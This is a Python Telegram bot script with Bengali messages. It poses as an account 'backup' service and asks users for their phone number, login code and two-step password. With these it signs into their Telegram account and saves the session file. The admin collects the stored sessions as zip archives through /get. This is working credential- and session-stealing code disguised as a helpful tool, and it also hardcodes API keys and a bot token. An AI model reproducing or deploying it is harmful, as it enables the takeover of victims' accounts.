import os
import asyncio
import zipfile
from flask import Flask
from threading import Thread
from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.errors import SessionPasswordNeeded

# ==================== কনফিগারেশন ====================
API_ID = 36547444  
API_HASH = "119a3ac4fd3dc368df92ae6d81f3bb3e"  
BOT_TOKEN = "8083684548:AAFGcdAYbXYb6X-edGyOFcdeeuRZXK05Wx0"  
ADMIN_ID = 8095751648  
# ===================================================

app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running perfectly!"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

STORAGE_DIR = "user_backups"
if not os.path.exists(STORAGE_DIR):
    os.makedirs(STORAGE_DIR)

user_data = {}

# কাস্টম ক্লাস তৈরি করে ইভেন্ট LooP ফিক্স করা
class CustomClient(Client):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        
    async def start(self):
        try:
            asyncio.get_running_loop()
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        return await super().start()

bot = CustomClient("universal_backup_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@bot.on_message(filters.command("start") & filters.private)
async def start_command(client: Client, message: Message):
    user_id = message.from_user.id
    if user_id == ADMIN_ID:
        await message.reply_text(
            "👋 স্বাগতম এডমিন!\n\n"
            "📊 স্টোরেজ চেক করতে: /status\n"
            "📦 জিপ ফাইল কেটে নিতে: `/get [ফাইলের সংখ্যা]`"
        )
    else:
        await message.reply_text(
            "👋 স্বাগতম! আপনার টেলিগ্রাম আইডির একটি জিপ ফাইল ব্যাকআপ তৈরি করতে "
            "আপনার phone নম্বরটি আন্তর্জাতিক ফরম্যাটে পাঠান (যেমন: +88017XXXXXXXX)।"
        )

@bot.on_message(filters.command("status") & filters.user(ADMIN_ID) & filters.private)
async def status_command(client: Client, message: Message):
    files = [f for f in os.listdir(STORAGE_DIR) if f.endswith(".zip")]
    await message.reply_text(f"📊 বর্তমানে বটের স্টোরেজে মোট **{len(files)}টি** জিপ ফাইল জমা আছে।")

@bot.on_message(filters.command("get") & filters.user(ADMIN_ID) & filters.private)
async def get_files(client: Client, message: Message):
    args = message.text.split()
    if len(args) < 2:
        await message.reply_text("❌ সঠিক ফরম্যাট: `/get 5`")
        return
    try:
        count = int(args[1])
    except ValueError:
        await message.reply_text("❌ ফাইলের সংখ্যাটি অবশ্যই সংখ্যা হতে হবে।")
        return

    all_zips = sorted([f for f in os.listdir(STORAGE_DIR) if f.endswith(".zip")])
    if not all_zips:
        await message.reply_text("❌ স্টোরেজে কোনো জিপ ফাইল নেই।")
        return
    
    files_to_take = all_zips[:count]
    actual_count = len(files_to_take)
    await message.reply_text(f"📦 {actual_count}টি জিপ ফাইল প্রসেস করা হচ্ছে...")
    
    master_zip_name = f"Admin_Fetch_{actual_count}_files.zip"
    try:
        with zipfile.ZipFile(master_zip_name, 'w') as master_zip:
            for file_name in files_to_take:
                file_path = os.path.join(STORAGE_DIR, file_name)
                master_zip.write(file_path, arcname=file_name)
                os.remove(file_path)
        await message.reply_document(document=master_zip_name, caption=f"✅ {actual_count}টি জিপ ফাইল পাঠানো হলো।")
    except Exception as e:
        await message.reply_text(f"❌ সমস্যা: {str(e)}")
    finally:
        if os.path.exists(master_zip_name):
            os.remove(master_zip_name)

@bot.on_message(filters.text & filters.private)
async def handle_login(client: Client, message: Message):
    user_id = message.from_user.id
    text = message.text.strip()

    if user_id == ADMIN_ID and not text.startswith("+") and user_id not in user_data:
        return

    if text.startswith("+"):
        phone_number = text
        await message.reply_text("⏳ টেলিগ্রাম সার্ভারে ওটিপি পাঠানো হচ্ছে...")
        clean_phone = phone_number.replace("+", "").replace(" ", "")
        temp_session_path = os.path.join(STORAGE_DIR, f"temp_{clean_phone}")
        
        user_client = CustomClient(temp_session_path, api_id=API_ID, api_hash=API_HASH)
        await user_client.connect()
        
        try:
            code_info = await user_client.send_code(phone_number)
            user_data[user_id] = {
                "client": user_client, "phone": phone_number,
                "phone_code_hash": code_info.phone_code_hash,
                "clean_phone": clean_phone, "temp_path": temp_session_path
            }
            await message.reply_text("📨 আপনার টেলিগ্রাম অ্যাপে যাওয়া ওটিপি কোডটি এখানে পাঠান।")
        except Exception as e:
            await message.reply_text(f"❌ ওটিপি পাঠানো যায়নি: {str(e)}")
            await user_client.disconnect()
            if os.path.exists(f"{temp_session_path}.session"):
                os.remove(f"{temp_session_path}.session")

    elif user_id in user_data and "phone_code_hash" in user_data[user_id]:
        data = user_data[user_id]
        user_client = data["client"]
        if data.get("waiting_for_password"):
            try:
                await user_client.check_password(text)
                await user_client.disconnect()
                session_file = f"{data['temp_path']}.session"
                final_zip_path = os.path.join(STORAGE_DIR, f"{data['clean_phone']}.zip")
                with zipfile.ZipFile(final_zip_path, 'w') as zipf:
                    if os.path.exists(session_file):
                        zipf.write(session_file, arcname=f"{data['clean_phone']}.session")
                if os.path.exists(session_file):
                    os.remove(session_file)
                await message.reply_text("✅ অ্যাকাউন্টটি সফলভাবে যুক্ত হয়েছে!")
                del user_data[user_id]
            except Exception as e:
                await message.reply_text(f"❌ ভুল পাসওয়ার্ড বা সমস্যা: {str(e)}\nআবার দিন:")
        else:
            await message.reply_text("⚙️ ভেরিফাই করা হচ্ছে...")
            try:
                await user_client.sign_in(data["phone"], data["phone_code_hash"], text)
                await user_client.disconnect()
                session_file = f"{data['temp_path']}.session"
                final_zip_path = os.path.join(STORAGE_DIR, f"{data['clean_phone']}.zip")
                with zipfile.ZipFile(final_zip_path, 'w') as zipf:
                    if os.path.exists(session_file):
                        zipf.write(session_file, arcname=f"{data['clean_phone']}.session")
                if os.path.exists(session_file):
                    os.remove(session_file)
                await message.reply_text("✅ অ্যাকাউন্টটি সফলভাবে যুক্ত হয়েছে!")
                del user_data[user_id]
            except SessionPasswordNeeded:
                await message.reply_text("🔐 Two-Step Verification অন আছে। পাসওয়ার্ডটি দিন:")
                user_data[user_id]["waiting_for_password"] = True
            except Exception as e:
                await message.reply_text(f"❌ লগইন ব্যর্থ: {str(e)}")
                await user_client.disconnect()
                if os.path.exists(f"{data['temp_path']}.session"):
                    os.remove(f"{data['temp_path']}.session")
                del user_data[user_id]

async def main_async():
    # ব্যাকগ্রাউন্ড ওয়েব সার্ভার চালু করা
    Thread(target=run_web, daemon=True).start()
    # টেলিগ্রাম বট স্টার্ট করা
    await bot.start()
    # বট রানিং রাখা
    while True:
        await asyncio.sleep(3600)

if __name__ == "__main__":
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        pass
